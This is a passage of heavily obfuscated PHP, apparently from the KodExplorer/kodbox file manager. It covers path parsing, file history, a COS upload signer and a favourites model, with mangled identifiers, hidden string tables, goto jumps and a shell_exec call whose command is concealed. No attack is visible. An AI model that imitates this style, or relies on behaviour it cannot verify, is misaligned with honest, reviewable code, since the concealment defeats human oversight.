$£Ä’ÇªŞ[$Ø÷àÚµ[369]] = $ÕÉºÊÏ÷; } } return $£Ä’ÇªŞ; } private static function saveData($íĞ×Ÿ¡÷, $…òåšó) { $¨¨œÏãÑ =& $_SERVER[ä¿÷‹µ±]; self::log($¨¨œÏãÑ[1261] . $íĞ×Ÿ¡÷ . $¨¨œÏãÑ[71] . count($…òåšó), $¨¨œÏãÑ[771]); if ($…òåšó) { return IO::setContent($íĞ×Ÿ¡÷, json_encode($…òåšó)); } $§Å²Ôæ® = IO::pathFather($íĞ×Ÿ¡÷); IO::remove($íĞ×Ÿ¡÷); self::clearEmptyFolder($§Å²Ôæ®); return !0; } public static function clearEmptyFolder($ŠŠ´°ñº) { $ßƒçßÏ =& $_SERVER[ä¿÷‹µ±]; if (trim($ŠŠ´°ñº, $ßƒçßÏ[8]) == trim(self::$_historyBase, $ßƒçßÏ[8])) { return; } $’œ“áŠŠ = IO::pathFather($ŠŠ´°ñº); $¸ÉÍşî = IO::has($ŠŠ´°ñº, !0); if ($¸ÉÍşî[$ßƒçßÏ[207]] > 0 || $¸ÉÍşî[$ßƒçßÏ[208]] > 0) { return; } IO::remove($ŠŠ´°ñº); self::clearEmptyFolder($’œ“áŠŠ); } private static function getBasePath() { $°÷àÇ¹º =& $_SERVER[ä¿÷‹µ±]; $¸·ÄÅ„¢ = Model($°÷àÇ¹º[1262])->get($°÷àÇ¹º[1263]); if ($¸·ÄÅ„¢) { if (!IO::exist($¸·ÄÅ„¢)) { IO::mkdir($¸·ÄÅ„¢); } if (get_path_this($¸·ÄÅ„¢) == $°÷àÇ¹º[1248]) { $Ôøß€ËÈ = $°÷àÇ¹º[1264] . rand_string(8); @rename($¸·ÄÅ„¢, get_path_father($¸·ÄÅ„¢) . $°÷àÇ¹º[8] . $Ôøß€ËÈ); $¸·ÄÅ„¢ = DATA_PATH . $Ôøß€ËÈ . $°÷àÇ¹º[8]; file_put_contents(DATA_PATH . $°÷àÇ¹º[1265], $°÷àÇ¹º[12]); Model($°÷àÇ¹º[1262])->set($°÷àÇ¹º[1263], $¸·ÄÅ„¢); } return $¸·ÄÅ„¢; } $¸·ÄÅ„¢ = DATA_PATH . $°÷àÇ¹º[1264] . rand_string(8) . $°÷àÇ¹º[8]; $¸·ÄÅ„¢ = IO::mkdir($¸·ÄÅ„¢); $¸·ÄÅ„¢ = rtrim($¸·ÄÅ„¢, $°÷àÇ¹º[8]) . $°÷àÇ¹º[8]; file_put_contents($¸·ÄÅ„¢ . $°÷àÇ¹º[1265], $°÷àÇ¹º[12]); file_put_contents(DATA_PATH . $°÷àÇ¹º[1265], $°÷àÇ¹º[12]); Model($°÷àÇ¹º[1262])->set($°÷àÇ¹º[1263], $¸·ÄÅ„¢); return $¸·ÄÅ„¢; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\162\122\145\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\x7b\165\163\145\162\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\x69\x6c\x65\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\151\154\x65\124\171\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\160\x52\x6f\x6f\x74\123\x65\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\x68\x61\162\145\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\124\157\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\x65\111\164\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\x61\x72\x65\x49\164\145\x6d\x4c\151\156\153\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\153\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\x6e\143\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\166\x65\x72\175"; public static function typeList() { $áîÅ¤€ =& $_SERVER[ä¿÷‹µ±]; return array($áîÅ¤€[1266] => self::KOD_SOURCE, $áîÅ¤€[1267] => self::KOD_USER_RECYCLE, $áîÅ¤€[1268] => self::KOD_USER_FAV, $áîÅ¤€[1269] => self::KOD_USER_FILE_TAG, $áîÅ¤€[1270] => self::KOD_USER_FILE_TYPE, $áîÅ¤€[1271] => self::KOD_GROUP_ROOT_SELF, $áîÅ¤€[1272] => self::KOD_USER_SHARE, $áîÅ¤€[1273] => self::KOD_USER_SHARE_LINK, $áîÅ¤€[1274] => self::KOD_USER_SHARE_TO_ME, $áîÅ¤€[1275] => self::KOD_SHARE_ITEM, $áîÅ¤€[1276] => self::KOD_SHARE_LINK, $áîÅ¤€[1277] => self::KOD_SEARCH, $áîÅ¤€[1278] => self::KOD_BLOCK, $áîÅ¤€[1279] => self::KOD_IO, $áîÅ¤€[1280] => self::KOD_USER_RECENT, $áîÅ¤€[1281] => self::KOD_USER_DRIVER); } public static function parse($é¤â÷ˆî) { $ôá«óğÏ =& $_SERVER[ä¿÷‹µ±]; $é¤â÷ˆî = self::clear($é¤â÷ˆî); $íí’Ğæ = array_values(self::typeList()); preg_match($ôá«óğÏ[1282], $é¤â÷ˆî, $Š‹Ş³À); $¬§ìõ£³ = array($ôá«óğÏ[422] => !1, $ôá«óğÏ[1283] => !1, $ôá«óğÏ[419] => !1, $ôá«óğÏ[84] => $é¤â÷ˆî, $ôá«óğÏ[1192] => !1, $ôá«óğÏ[1191] => $ôá«óğÏ[12]); if (is_array($Š‹Ş³À) && count($Š‹Ş³À) == 5) { $šÏ²şú¬ = $ôá«óğÏ[1284] . $Š‹Ş³À[2] . $ôá«óğÏ[327]; if (in_array($šÏ²şú¬, $íí’Ğæ)) { $¬§ìõ£³[$ôá«óğÏ[1192]] = $Š‹Ş³À[1]; $¬§ìõ£³[$ôá«óğÏ[33]] = $šÏ²şú¬; $¬§ìõ£³[$ôá«óğÏ[1285]] = substr($šÏ²şú¬, 1, -1); $¬§ìõ£³[$ôá«óğÏ[399]] = $Š‹Ş³À[3]; } $¬§ìõ£³[$ôá«óğÏ[1191]] = $Š‹Ş³À[4]; } $œãŸÍ®´ = array($ôá«óğÏ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¬§ìõ£³[$ôá«óğÏ[1247]] = in_array($¬§ìõ£³[$ôá«óğÏ[33]], $œãŸÍ®´); return $¬§ìõ£³; } public static function isTruePath($ÜÁËŒ‰) { $İÈÈçüÙ =& $_SERVER[ä¿÷‹µ±]; if (substr($ÜÁËŒ‰, 0, 1) != $İÈÈçüÙ[1284]) { return !0; } if (strpos($ÜÁËŒ‰, $İÈÈçüÙ[408]) === 0) { return !0; } if (strpos($ÜÁËŒ‰, $İÈÈçüÙ[1251]) === 0) { return !0; } if (strpos($ÜÁËŒ‰, $İÈÈçüÙ[1286]) === 0) { return !0; } if (strpos($ÜÁËŒ‰, $İÈÈçüÙ[1287]) === 0) { return !0; } if (strpos($ÜÁËŒ‰, $İÈÈçüÙ[1288]) === 0) { return !0; } return !1; } public static function clear($óÛ«Ù¼ù) { $Ô¯£ßÊš =& $_SERVER[ä¿÷‹µ±]; $óÛ«Ù¼ù = str_replace(array($Ô¯£ßÊš[1100], $Ô¯£ßÊš[231]), $Ô¯£ßÊš[53], $óÛ«Ù¼ù); $óÛ«Ù¼ù = str_replace($Ô¯£ßÊš[97], $Ô¯£ßÊš[8], $óÛ«Ù¼ù); $Ò©Šù¼ = $Ô¯£ßÊš[1289]; if (substr($óÛ«Ù¼ù, 0, 3) == $Ô¯£ßÊš[1290]) { $óÛ«Ù¼ù = substr($óÛ«Ù¼ù, 3); } while (strstr($óÛ«Ù¼ù, $Ò©Šù¼)) { $óÛ«Ù¼ù = str_replace($Ò©Šù¼, $Ô¯£ßÊš[8], $óÛ«Ù¼ù); } $óÛ«Ù¼ù = preg_replace($Ô¯£ßÊš[1291], $Ô¯£ßÊš[8], $óÛ«Ù¼ù); if ($óÛ«Ù¼ù == $Ô¯£ßÊš[8]) { return $Ô¯£ßÊš[8]; } $óÛ«Ù¼ù = rtrim($óÛ«Ù¼ù, $Ô¯£ßÊš[8]); return $óÛ«Ù¼ù; } public static function sourceID($ªßİ¶âæ) { $ÕèÜíø =& $_SERVER[ä¿÷‹µ±]; $Ôµ»—Æå = self::parse($ªßİ¶âæ); if ($Ôµ»—Æå[$ÕèÜíø[33]] !== self::KOD_SOURCE) { show_json(LNG($ÕèÜíø[1292]), !1); } return $Ôµ»—Æå[$ÕèÜíø[399]]; } public static function make($é¡‹œù) { if (!$é¡‹œù) { return !1; } return self::makePath(self::KOD_SOURCE, intval($é¡‹œù)); } public static function makeShare($ñİîĞ‰İ, $¿²£¬èª) { return self::makePath(self::KOD_SHARE_ITEM, $ñİîĞ‰İ, $¿²£¬èª); } public static function makeFileTypePath($¥ƒû‹ù½) { return self::makePath(self::KOD_USER_FILE_TYPE, $¥ƒû‹ù½); } public static function makeFileTagPath($üşâıÆé) { return self::makePath(self::KOD_USER_FILE_TAG, $üşâıÆé); } public static function makePath($­Î‹¦·Ğ, $¯¦•…¶ø = '', $¢Šä’¢® = '') { $ÌÓ±Àô— =& $_SERVER[ä¿÷‹µ±]; $¶†©Ç¾Ö = substr($­Î‹¦·Ğ, 1, -1); $ùÚÒÜ–í = $ÌÓ±Àô—[1293] . $¶†©Ç¾Ö . $ÌÓ±Àô—[1294] . $¯¦•…¶ø . $ÌÓ±Àô—[1295]; $ùÚÒÜ–í = $¢Šä’¢® ? $ùÚÒÜ–í . $¢Šä’¢® . $ÌÓ±Àô—[8] : $ùÚÒÜ–í; return $ùÚÒÜ–í; } public static function hashPath($†èÉ£§Ô, $¬·Ì½ˆ = true) { $‹Èõéñ† =& $_SERVER[ä¿÷‹µ±]; $²¤©æï = is_array($†èÉ£§Ô) ? $†èÉ£§Ô : IO::info($†èÉ£§Ô); $Æ»•ÑÙ„ = _get($²¤©æï, $‹Èõéñ†[1296], $‹Èõéñ†[12]); if (!$Æ»•ÑÙ„ && isset($²¤©æï[$‹Èõéñ†[402]])) { $²¤©æï = IO::info(KodIO::make($²¤©æï[$‹Èõéñ†[402]])); $Æ»•ÑÙ„ = _get($²¤©æï, $‹Èõéñ†[1296], $‹Èõéñ†[12]); } if (!$Æ»•ÑÙ„ && $¬·Ì½ˆ) { $ƒÔş¼é¿ = KodIO::parse($²¤©æï[$‹Èõéñ†[84]]); if (!$ƒÔş¼é¿[$‹Èõéñ†[33]]) { $Æ»•ÑÙ„ = IO::hashSimple($²¤©æï[$‹Èõéñ†[84]]); } } if (!$Æ»•ÑÙ„) { $Æ»•ÑÙ„ = md5($²¤©æï[$‹Èõéñ†[84]] . $²¤©æï[$‹Èõéñ†[76]] . $²¤©æï[$‹Èõéñ†[85]]); } return $Æ»•ÑÙ„; } public static function initSystemPath() { $˜ˆ¾„¥Á =& $_SERVER[ä¿÷‹µ±]; if (defined($˜ˆ¾„¥Á[1297])) { return; } define($˜ˆ¾„¥Á[1297], self::systemPath($˜ˆ¾„¥Á[1298])); define($˜ˆ¾„¥Á[1299], self::systemPath($˜ˆ¾„¥Á[1300])); define($˜ˆ¾„¥Á[1301], self::systemPath($˜ˆ¾„¥Á[1302])); define($˜ˆ¾„¥Á[1303], self::systemPath($˜ˆ¾„¥Á[1304])); IOHistory::bindEvent(); } public static function systemPath($´ûâÊşƒ) { $ÆÂÏ¹ã =& $_SERVER[ä¿÷‹µ±]; $Øç×»Šş = $ÆÂÏ¹ã[1305] . ucfirst($´ûâÊşƒ); $ÅİÌ·¥‘ = Model($ÆÂÏ¹ã[789])->get($Øç×»Šş); if ($ÅİÌ·¥‘) { return $ÅİÌ·¥‘; } if ($´ûâÊşƒ == $ÆÂÏ¹ã[1298]) { $ÅİÌ·¥‘ = self::make(Model($ÆÂÏ¹ã[844])->systemRootPathAdd($ÆÂÏ¹ã[544])); } else { $ÅİÌ·¥‘ = self::systemPath($ÆÂÏ¹ã[1298]); $éÆÉ’ÍĞ = self::sourceID($ÅİÌ·¥‘); $ÅİÌ·¥‘ = self::make(Model($ÆÂÏ¹ã[844])->mkdir($éÆÉ’ÍĞ, $´ûâÊşƒ)); } Model($ÆÂÏ¹ã[789])->set($Øç×»Šş, $ÅİÌ·¥‘); return $ÅİÌ·¥‘; } public static function systemFolder($Ô¿’Àóò) { $øÎ®­ó = IO_PATH_SYSTEM_SOURCE . $Ô¿’Àóò; $”å…Îœ“ = Cache::get($øÎ®­ó); if (!$”å…Îœ“) { $üË˜Ê¦Ô = IO::infoFull($øÎ®­ó); if (!$üË˜Ê¦Ô) { $”å…Îœ“ = IO::mkdir($øÎ®­ó, REPEAT_SKIP); } else { $”å…Îœ“ = $üË˜Ê¦Ô[$_SERVER[ä¿÷‹µ±][84]]; } Cache::set($øÎ®­ó, $”å…Îœ“, 3600 * 10); } return $”å…Îœ“; } public static function defaultDriver() { return Model($_SERVER[ä¿÷‹µ±][786])->defaultDriver(); } public static function defaultIO() { $©†ãÈ¤ =& $_SERVER[ä¿÷‹µ±]; $ºÁ–ÇÉâ = self::defaultDriver(); return $©†ãÈ¤[1306] . $ºÁ–ÇÉâ[$©†ãÈ¤[399]] . $©†ãÈ¤[1295]; } public static function defaultDriverInit() { static $èú›Ñ°İ = false; if ($èú›Ñ°İ) { return $èú›Ñ°İ; } $èú›Ñ°İ = IO::init(self::defaultIO()); return $èú›Ñ°İ; } public static function fileTypeList() { $ç¨ƒ¬š¢ =& $_SERVER[ä¿÷‹µ±]; $ç’Ùı¾ñ = $GLOBALS[$ç¨ƒ¬š¢[6]][$ç¨ƒ¬š¢[1307]]; foreach ($ç’Ùı¾ñ as $ï„“ÕŞ => $÷¦Å¤Û) { $‹˜Í¯ºÈ = $ç¨ƒ¬š¢[1308] . $ï„“ÕŞ; $í„âÒ•£ = LNG($‹˜Í¯ºÈ); if ($‹˜Í¯ºÈ != $í„âÒ•£) { $ç’Ùı¾ñ[$ï„“ÕŞ][$ç¨ƒ¬š¢[32]] = $í„âÒ•£; } } return $ç’Ùı¾ñ; } public static function diskList($äò÷¶À = true) { $ä¾´¤î = $_SERVER[ä¿÷‹µ±][1309]; if ($äò÷¶À) { $úÖíŒ‚§ = Cache::get($ä¾´¤î); if (is_array($úÖíŒ‚§)) { return $úÖíŒ‚§; } } $úÖíŒ‚§ = self::diskListGet(); Cache::set($ä¾´¤î, $úÖíŒ‚§, 60); return $úÖíŒ‚§; } public static function diskListGet() { $©†óÆ‚Ë =& $_SERVER[ä¿÷‹µ±]; $”õËÓ” = array(); if ($GLOBALS[$©†óÆ‚Ë[6]][$©†óÆ‚Ë[1310]] == $©†óÆ‚Ë[1311]) { $‹¹Ó• = $©†óÆ‚Ë[1312]; for ($ûøìÜŸ´ = 0; $ûøìÜŸ´ < strlen($‹¹Ó•); $ûøìÜŸ´++) { $àùä¼å = $‹¹Ó•[$ûøìÜŸ´] . $©†óÆ‚Ë[1313]; if (file_exists($àùä¼å)) { $”õËÓ”[] = $àùä¼å; } } return $”õËÓ”; } if (!function_exists($©†óÆ‚Ë[98])) { $”õËÓ”[] = $©†óÆ‚Ë[854]; return $”õËÓ”; } $ó´¶µ‰¦ = explode($©†óÆ‚Ë[231], shell_exec($©†óÆ‚Ë[1314])); array_shift($ó´¶µ‰¦); array_pop($ó´¶µ‰¦); $›˜æ ’» = array($©†óÆ‚Ë[1315], $©†óÆ‚Ë[1316], $©†óÆ‚Ë[1317], $©†óÆ‚Ë[1318], $©†óÆ‚Ë[1319], $©†óÆ‚Ë[1320], $©†óÆ‚Ë[1321], $©†óÆ‚Ë[1322]); foreach ($ó´¶µ‰¦ as $™íéÕ’˜) { $ìêÍ¥ºØ = preg_split($©†óÆ‚Ë[1323], $™íéÕ’˜); $àùä¼å = $ìêÍ¥ºØ[count($ìêÍ¥ºØ) - 1]; if (!strstr($ìêÍ¥ºØ[0], $©†óÆ‚Ë[1324]) || !$àùä¼å) { continue; } $şÆà‚® = rtrim($àùä¼å, $©†óÆ‚Ë[8]) . $©†óÆ‚Ë[8]; if (in_array($şÆà‚®, $›˜æ ’»)) { continue; } $”õËÓ”[] = $şÆà‚®; } return $”õËÓ”; } public static function isSameDisk($§ßè÷ÔÓ, $÷”¿€é) { $Æ ‘³û =& $_SERVER[ä¿÷‹µ±]; if ($GLOBALS[$Æ ‘³û[6]][$Æ ‘³û[1310]] == $Æ ‘³û[1311]) { return strtolower(substr($§ßè÷ÔÓ, 0, 1)) == strtolower(substr($÷”¿€é, 0, 1)); } $€ıï¨ü = self::diskList(); $íÜ€¦àÈ = !1; $¬î”Ğ = !1; sort($€ıï¨ü); $€ıï¨ü = array_reverse($€ıï¨ü); $§ßè÷ÔÓ = rtrim($§ßè÷ÔÓ, $Æ ‘³û[8]) . $Æ ‘³û[8]; $÷”¿€é = rtrim($÷”¿€é, $Æ ‘³û[8]) . $Æ ‘³û[8]; foreach ($€ıï¨ü as $ıŒ„«¡Ç) { $Í¶ÖâÒ¥ = strlen($ıŒ„«¡Ç); if (!$íÜ€¦àÈ && substr($§ßè÷ÔÓ, 0, $Í¶ÖâÒ¥) == $ıŒ„«¡Ç) { $íÜ€¦àÈ = $ıŒ„«¡Ç; } if (!$¬î”Ğ && substr($÷”¿€é, 0, $Í¶ÖâÒ¥) == $ıŒ„«¡Ç) { $¬î”Ğ = $ıŒ„«¡Ç; } if ($íÜ€¦àÈ && $¬î”Ğ) { break; } } return $íÜ€¦àÈ === $¬î”Ğ; } public static function transferType($¡Çãş«, $ê¿ÉÅÈ) { $¾¼‡ºé° =& $_SERVER[ä¿÷‹µ±]; $Ó½Ã¯„ = self::driverType($¡Çãş«); $€Ó×¼Ä = self::driverType($ê¿ÉÅÈ); if ($Ó½Ã¯„[$¾¼‡ºé°[33]] == $€Ó×¼Ä[$¾¼‡ºé°[33]] && $Ó½Ã¯„[$¾¼‡ºé°[1325]] == $€Ó×¼Ä[$¾¼‡ºé°[1325]]) { return $¾¼‡ºé°[1326]; } if ($Ó½Ã¯„[$¾¼‡ºé°[33]] == $¾¼‡ºé°[883] && $€Ó×¼Ä[$¾¼‡ºé°[33]] == $¾¼‡ºé°[106]) { return $¾¼‡ºé°[1221]; } if ($Ó½Ã¯„[$¾¼‡ºé°[33]] == $¾¼‡ºé°[106] && $€Ó×¼Ä[$¾¼‡ºé°[33]] == $¾¼‡ºé°[883]) { return $¾¼‡ºé°[107]; } return $¾¼‡ºé°[1327]; } public static function driverType($¸Ó€ŠÜ‰) { $‘ñßŸÒ° =& $_SERVER[ä¿÷‹µ±]; $¸ıÅ‡à = str_replace($‘ñßŸÒ°[1328], $‘ñßŸÒ°[12], strtolower($¸Ó€ŠÜ‰->getType())); if ($¸ıÅ‡à == $‘ñßŸÒ°[777] || $¸ıÅ‡à == $‘ñßŸÒ°[1329] || $¸ıÅ‡à == $‘ñßŸÒ°[1330]) { $¸Ó€ŠÜ‰ = self::defaultDriverInit(); } else { if ($¸ıÅ‡à == $‘ñßŸÒ°[1228] || $¸ıÅ‡à == $‘ñßŸÒ°[1331]) { $¸Ó€ŠÜ‰ = IO::init($¸Ó€ŠÜ‰->pathParse[$‘ñßŸÒ°[1173]]); } } $’âÇÍĞì = $¸Ó€ŠÜ‰->path; $¸ıÅ‡à = str_replace($‘ñßŸÒ°[1328], $‘ñßŸÒ°[12], strtolower($¸Ó€ŠÜ‰->getType())); if ($¸ıÅ‡à == $‘ñßŸÒ°[106]) { return array($‘ñßŸÒ°[33] => $‘ñßŸÒ°[106], $‘ñßŸÒ°[1325] => $‘ñßŸÒ°[12], $‘ñßŸÒ°[84] => $’âÇÍĞì); } return array($‘ñßŸÒ°[33] => $‘ñßŸÒ°[883], $‘ñßŸÒ°[1325] => $¸Ó€ŠÜ‰->pathDriver, $‘ñßŸÒ°[84] => $’âÇÍĞì); } public static function pathDriverType($¹úŸêº) { return $¹úŸêº ? self::driverType(IO::init($¹úŸêº)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ÏôûòÎ) { parent::__construct($ÏôûòÎ); $this->signatureVersion($_SERVER[ä¿÷‹µ±][216]); } public function uploadFormData($ºéÀĞ…, $§ÙíïªÛ = 3600) { $ØšÜ—ÓÈ =& $_SERVER[ä¿÷‹µ±]; $¯¯¨ÅªÀ = $ØšÜ—ÓÈ[198]; $Íü­ç¾® = $ØšÜ—ÓÈ[232]; $ãë®Ù²ş = $ØšÜ—ÓÈ[1332]; $»îÕîò = gmdate($ØšÜ—ÓÈ[1333], time() + $§ÙíïªÛ); $¯²¼ùÒ = (string) time() . $ØšÜ—ÓÈ[71] . (string) (time() + $§ÙíïªÛ); $Á®–ğÃ¸ = array($ØšÜ—ÓÈ[1334] => $»îÕîò, $ØšÜ—ÓÈ[1335] => array(array($ØšÜ—ÓÈ[1336] => $¯¯¨ÅªÀ), array($ØšÜ—ÓÈ[1337] => $this->bucket), array($ØšÜ—ÓÈ[1338], $ØšÜ—ÓÈ[1339], $ØšÜ—ÓÈ[12]), array($ØšÜ—ÓÈ[1340] => $ãë®Ù²ş), array($ØšÜ—ÓÈ[1341] => $Íü­ç¾®), array($ØšÜ—ÓÈ[1342] => $this->accessKey), array($ØšÜ—ÓÈ[1343] => $¯²¼ùÒ))); $Á®–ğÃ¸ = json_encode($Á®–ğÃ¸); $£ö£€é = hash_hmac($ØšÜ—ÓÈ[232], $¯²¼ùÒ, $this->secret); $ßäÈ©Ö = sha1($Á®–ğÃ¸); $ûÎÏóã = hash_hmac($ØšÜ—ÓÈ[232], $ßäÈ©Ö, $£ö£€é); $Ş»ô¯şø = array($ØšÜ—ÓÈ[1336] => $¯¯¨ÅªÀ, $ØšÜ—ÓÈ[1340] => $ãë®Ù²ş, $ØšÜ—ÓÈ[1344] => base64_encode($Á®–ğÃ¸), $ØšÜ—ÓÈ[1341] => $Íü­ç¾®, $ØšÜ—ÓÈ[1342] => $this->accessKey, $ØšÜ—ÓÈ[1345] => $¯²¼ùÒ, $ØšÜ—ÓÈ[1346] => $ûÎÏóã, $ØšÜ—ÓÈ[181] => $this->getHost()); return $Ş»ô¯şø; } public function fileOutLink($î²şßê€) { $üç—œ¶¾ =& $_SERVER[ä¿÷‹µ±]; if (substr($î²şßê€, 0, 7) == $üç—œ¶¾[1347]) { $î²şßê€ = $üç—œ¶¾[1348] . substr($î²şßê€, 7); } header($üç—œ¶¾[161] . $î²şßê€); die; } } goto D‰ºˆ¾Š¢º; e™Û±Ä„Ô: function binCheckBigger($¾°Ôø¶, $‰³ç…ÁŸ) { return $¾°Ôø¶ > $‰³ç…ÁŸ; } $_SERVER[$_SERVER[²Ø‡¦âƒ][3]] = (strrev('2018')."\70\61")+0;$_blhw="mp0rn2xyajzlhg7ktwie1b9d3ufov45sq6c8eljavyx9tg02bkm41oh37inwq6z5frdu8spcfsup385qh4";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ĞâŸÜ, $ÆÕâÖ—ï) { $¬†¿¨ô– =& $_SERVER[ä¿÷‹µ±]; if (isset(self::$_methodList[$ĞâŸÜ])) { return @call_user_func_array(self::$_methodList[$ĞâŸÜ], $ÆÕâÖ—ï); } else { if (method_exists($this, $ĞâŸÜ)) { return call_user_func_array(array($this, $ĞâŸÜ), $ÆÕâÖ—ï); } else { think_exception(__CLASS__ . $¬†¿¨ô–[4] . $ĞâŸÜ . $¬†¿¨ô–[5]); } } } public static function __callStatic($‚ø¦‰¾ò, $ˆÕå˜Œ ) { if (isset(self::$_methodListStatic[$‚ø¦‰¾ò])) { return call_user_func_array(self::$_methodListStatic[$‚ø¦‰¾ò], $ˆÕå˜Œ ); } else { if (method_exists(self, $‚ø¦‰¾ò)) { return call_user_func_array(array(self, $‚ø¦‰¾ò), $ˆÕå˜Œ ); } else { show_json("{$‚ø¦‰¾ò}\x28\x29\40\x6e\157\x74\x20\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($¢®èıåó, $›ÏÍÜè¡) { self::$_methodList[$¢®èıåó] = $›ÏÍÜè¡; } public static function addMethodStatic($ìÎ•Áëí, $«ˆØ±£) { self::$_methodListStatic[$ìÎ•Áëí] = $«ˆØ±£; } } goto b”ÓğæÏ°¤; Bó£ºäÌÏ‡: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($¥ä¶©ïñ) { $¨´´…Í =& $_SERVER[ä¿÷‹µ±]; return array($¨´´…Í[1961] => array(USER_ID, $¨´´…Í[2291])); } protected function listData() { $º˜¦•à =& $_SERVER[ä¿÷‹µ±]; $âÑ©‘†Ê = array($º˜¦•à[1669] => USER_ID, $º˜¦•à[484] => 0); $‡¬¾¯•è = $º˜¦•à[2292]; $ÊØ°Ç¶­ = $this->field($‡¬¾¯•è)->where($âÑ©‘†Ê)->order($º˜¦•à[2293])->select(); return $ÊØ°Ç¶­ ? $ÊØ°Ç¶­ : array(); } protected function resetCache() { } protected function listView() { $×·ş¬‹¶ =& $_SERVER[ä¿÷‹µ±]; $Öô”ò‡ = $this->listData(); $Ô³“­Å  = array_filter_by_field($Öô”ò‡, $×·ş¬‹¶[33], $×·ş¬‹¶[416]); $öË¿Ò¬È = array_to_keyvalue($Ô³“­Å , $×·ş¬‹¶[12], $×·ş¬‹¶[84]); if (!$öË¿Ò¬È) { return $Öô”ò‡; } $Ï”‡¦ù¨ = 2000; $­ç›ª‰ = array($×·ş¬‹¶[417] => array($×·ş¬‹¶[418], $öË¿Ò¬È)); $ƒçí‚ö“ = Model($×·ş¬‹¶[844])->listSource($­ç›ª‰, $Ï”‡¦ù¨); $ƒçí‚ö“ = array_merge($ƒçí‚ö“[$×·ş¬‹¶[83]], $ƒçí‚ö“[$×·ş¬‹¶[82]]); $ƒçí‚ö“ = array_to_keyvalue($ƒçí‚ö“, $×·ş¬‹¶[402]); foreach ($Öô”ò‡ as $Ø¼‹†Œ => $§îâœˆ²) { $èÒÍƒäĞ = $ƒçí‚ö“[$§îâœˆ²[$×·ş¬‹¶[84]]]; $èÒÍƒäĞ = $èÒÍƒäĞ ? $èÒÍƒäĞ : array(); $Öô”ò‡[$Ø¼‹†Œ] = array_merge($èÒÍƒäĞ, $§îâœˆ²); } return $Öô”ò‡; } protected function addFav($¼ÔöÙàİ, $¤í„†”µ = '', $ÁšÜ«’š = "\163\157\x75\x72\143\x65") { $ÈşÇãç¨ =& $_SERVER[ä¿÷‹µ±]; $íÃŒÈ³å = array($ÈşÇãç¨[1669] => USER_ID, $ÈşÇãç¨[484] => 0, $ÈşÇãç¨[422] => $ÁšÜ«’š, $ÈşÇãç¨[421] => $¼ÔöÙàİ); if ($this->where($íÃŒÈ³å)->find()) { return !1; } $íÃŒÈ³å = array($ÈşÇãç¨[1669] => USER_ID, $ÈşÇãç¨[484] => 0); $—Ì©±Õ = $this->where($íÃŒÈ³å)->max($ÈşÇãç¨[1874]); if (!$—Ì©±Õ) { $—Ì©±Õ = 0; } if (!$¤í„†”µ && $ÁšÜ«’š == $ÈşÇãç¨[416]) { $³¨»“¿ = Model($ÈşÇãç¨[1349])->where(array($ÈşÇãç¨[417] => $¼ÔöÙàİ))->find(); if (!$³¨»“¿) { return !1; } $¤í„†”µ = $³¨»“¿[$ÈşÇãç¨[32]]; } $¤í„†”µ = $this->getAutoName($¤í„†”µ); $‚¡œÌó¬ = array($ÈşÇãç¨[1669] => USER_ID, $ÈşÇãç¨[484] => 0, $ÈşÇãç¨[420] => $¤í„†”µ, $ÈşÇãç¨[421] => $¼ÔöÙàİ, $ÈşÇãç¨[422] => $ÁšÜ«’š, $ÈşÇãç¨[1854] => $—Ì©±Õ + 1); return $this->add($‚¡œÌó¬); } protected function remove($É„ÈØ—Ÿ) { $¦ßÁ‚Ü¸ =& $_SERVER[ä¿÷‹µ±]; $ñ¢¶Œèï = array($¦ßÁ‚Ü¸[1669] => USER_ID, $¦ßÁ‚Ü¸[419] => $É„ÈØ—Ÿ); return $this->where($ñ¢¶Œèï)->delete(); } protected function removeByName($Äûœô¡¼) { $×¯àòÈœ =& $_SERVER[ä¿÷‹µ±]; $î£ÊŒ¾‡ = array($×¯àòÈœ[1669] => USER_ID, $×¯àòÈœ[420] => $Äûœô¡¼, $×¯àòÈœ[484] => 0); return $this->where($î£ÊŒ¾‡)->delete(); } protected function rename($†û®ËŒ«, $ûç‡ÏøÜ) { $İë¤ÄÛ² =& $_SERVER[ä¿÷‹µ±]; if ($†û®ËŒ« == $ûç‡ÏøÜ) { return !1; } $û’¶è˜‹ = $this->getAutoName($ûç‡ÏøÜ); if ($ûç‡ÏøÜ != $û’¶è˜‹) { return !1; } $Ö‚„øúì = array($İë¤ÄÛ²[1669] => USER_ID, $İë¤ÄÛ²[484] => 0, $İë¤ÄÛ²[32] => $†û®ËŒ«); return $this->where($Ö‚„øúì)->save(array($İë¤ÄÛ²[32] => $ûç‡ÏøÜ)); } protected function resetSort($Ä³‡‰¼§) { $â ”•Û¤ =& $_SERVER[ä¿÷‹µ±]; $Ä³‡‰¼§ = is_array($Ä³‡‰¼§) ? $Ä³‡‰¼§ : array(); $à‹ƒíä = array($â ”•Û¤[1669] => USER_ID); for ($Ñ¢­ÔšÁ = 0; $Ñ¢­ÔšÁ < count($Ä³‡‰¼§); $Ñ¢­ÔšÁ++) { $à‹ƒíä[$â ”•Û¤[419]] = 